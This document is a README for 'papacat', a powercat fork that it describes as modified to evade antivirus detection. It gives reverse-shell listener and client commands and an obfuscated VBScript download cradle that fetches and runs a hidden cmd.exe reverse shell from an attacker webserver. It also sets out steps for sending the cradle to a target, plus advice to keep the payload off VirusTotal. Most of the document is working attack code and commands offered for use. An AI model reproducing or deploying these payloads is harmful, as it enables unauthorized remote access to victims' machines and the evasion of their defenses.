     powercat - Netcat, The Powershell Version
     Github Repository: https://github.com/besimorhino/powercat
     
     This script attempts to implement the features of netcat in a powershell
     script. It also contains extra features such as built-in relays, execute
     powershell, and a dnscat2 client. 
     
     Redpill papacat version its a modified version of powercat to bypass AV detection.
     
     
     Usage: papacat [-c or -l] [-p port] [options]
     -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                     If you are using -dns, specify the DNS Server to send queries to.
            
     -l              Listen Mode. Start a listener on the port specified by -p.
  
     -p  <port>      Port. The port to connect to, or the port to listen on.
  
     -e  <proc>      Execute. Specify the name of the process to start.
  
     -ep             Execute Powershell. Start a pseudo powershell session. You can
                     declare variables and execute commands, but if you try to enter
                     another shell (nslookup, netsh, cmd, etc.) the shell will hang.
            
     -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                     connecting. Default: 60
            
     -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                     established. Used for moving files. You can provide the path to a file,
                     a byte array object, or a string. You can also pipe any of those into
                     papacat, like 'aaaaaa' | papacat -c 10.1.1.1 -p 80
            
     -o  <type>      Output. Specify how papacat should return information to the console.
                     Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
            
     -of <path>      Output File.  Specify the path to a file to write output to.
            
     -d              Disconnect. papacat will disconnect after the connection is established
                     and the input from -i is sent. Used for scanning.
            
     -rep            Repeater. papacat will continually restart after it is disconnected.
                     Used for setting up a persistent server.
                  
     -g              Generate Payload.  Returns a script as a string which will execute the
                     papacat with the options you have specified. -i, -d, and -rep will not
                     be incorporated.
                  
     -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                     can be executed in this way: powershell -E <encoded string>
     -h              Print this help message.
     
     Examples:
     Listen on port 8000 and print the output to the console.
         papacat -l -p 8000 -v
  
     Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
         papacat -c 10.1.1.1 -p 443 -e cmd -v
  
     Send a file to 10.1.1.15 port 8000.
         papacat -c 10.1.1.15 -p 8000 -i C:\inputfile
  
     Write the data sent to the local listener on port 4444 to C:\outfile
         papacat -l -p 4444 -of C:\outfile
  
     Listen on port 8000 and repeatedly server a powershell shell.
         papacat -l -p 8000 -ep -rep -v

<br />

# papacat Manual Execution

<br />

### Download cmdlet
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/hacking-material-books/master/papacat.ps1" -OutFile "papacat.ps1"
```

<br />

### handler (listenner)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -l -p 666
```

### Cmd Client (payload)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -c 192.168.1.72 -e cmd.exe -p 666
```

### powershell Client (payload)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -c 192.168.1.72 -ep -p 666 -v
```

---

<br /><br />

# Automation - Obfuscation ( @Meterpeter )

<br />

### [update.vbs] download crandle
```vbscript
' Author: @r00t-3xp10it (ssa)
' Application: papacat download crandle
' Description:
'   This VBS will download Trigger.ps1 (rev tcp shell) from attacker webserver
'   imports module and executes module in a hidden console. ( background )
' ---

dIm Char,Cmd,Layback
Char="@!COLOMBO@!"+":007:VIRIATO@!"+"NAVIGATOR@!"
Layback=rEpLaCe(Char, "@!", ""):Cmd=rEpLaCe(Layback, ":007:", "")

set ObjConsole = CreateObject("Wscript.Shell")
ObjConsole.Run("powershell.exe cd $Env:TMP;iwr -Uri http://"+Cmd+"/Trigger.ps1 -OutFile Trigger.ps1;Import-Module -Name .\Trigger.ps1 -Force;Trigger-c Server@Local@host -e cmd.exe -p 666"), 0
}
```

<br />

### Download cmdlet
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/hacking-material-books/master/papacat.ps1" -OutFile "papacat.ps1"
```


### Generate - Cmd Client (payload) Obfucated
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -c 192.168.1.72 -e cmd.exe -p 666 -g > Trigger.ps1
```

<br />

## The next section requires using terminal to execute commands ...
- Get Local host adress to config the crandle
- replace <b><i>8080</i></b> by <b><i>apache\http.server</i></b> port (webserver)
```powershell
$Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$FirstRange = $Local_Host[0,1,2,3,4] -join ''                          # 192.1   - COLOMBO
$SeconRange = $Local_Host[5,6,7,8] -join ''                            # 68.1    - VIRIATO
$TrithRange = $Local_Host[9,10,11,12,13,14,15,16,17,18,19,20] -join '' #.72
$LastRanges = "$TrithRange" + ":" + "8080" -join ''                    #.72:8080 - NAVIGATOR
```
- Replace the attacker ip addr (obfuscated\split) on vbs crandle
```powershell
((Get-Content -Path "update.vbs" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "update.vbs"
((Get-Content -Path "update.vbs" -Raw) -Replace "COLOMBO","$FirstRange ")|Set-Content -Path "update.vbs"
((Get-Content -Path "update.vbs" -Raw) -Replace "NAVIGATOR","$LastRanges")|Set-Content -Path "update.vbs" 
((Get-Content -Path "update.vbs" -Raw) -Replace "Server@Local@host","$Local_Host")|Set-Content -Path "update.vbs" 
``` 


<br />

- start the handler `Import-Module -Name .\papacat.ps1 -Force;papacat -l -p 666`
- Store update.vbs + copy Trigger.ps1 on attacker webserver (port 8080)
- send update.vbs url to target to trigger the client download (Trigger.ps1)
- execute update.vbs on target machine to get the connection back

![papacat](https://user-images.githubusercontent.com/23490060/155600050-539eeac6-26ee-46e0-a8eb-061daac5e38c.png)

<br /><br />

### URL
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1<br />
https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells

## Final Notes
Dont Test this on VirusTotal or similar websites ...
